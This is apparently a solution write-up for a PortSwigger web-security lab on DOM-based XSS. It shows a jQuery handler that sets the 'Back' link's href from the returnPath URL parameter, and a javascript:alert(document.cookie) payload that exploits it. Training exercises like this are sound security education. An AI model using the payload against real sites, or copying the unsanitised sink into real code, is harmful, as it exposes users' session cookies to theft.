# Lab-5: [DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's ``` $ ``` selector function to find an anchor element, and changes its ``` href ``` attribute using data from ``` location.search ```.

**Aim :-** To solve this lab, make the "back" link alert ``` document.cookie ```. 



## Solution
- Check the source code of **submit feedback** page
    ```
    <div class="is-linkback">
        <a id="backLink">Back</a>
    </div>
    <script>
        $(function() {
            $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
        });
    </script>
    ```
    - The source code reveals that the anchor tag’s ``` href ``` value is automatically assigned from the user-controlled ``` returnPath ``` URL parameter.


- To alert ``` cookie ``` change the value of the ``` returnPath ``` parameter in the URL to ``` javascript:alert(document.cookie) ``` 
    - This will make the anchor tag like the following.
    ``` <a id=backLink href="javascript:alert(document.cookie)">Back</a> ```

    - By clicking the ``` Back ``` link on the page the website will popup an alert box with ``` cookie ``` init. 
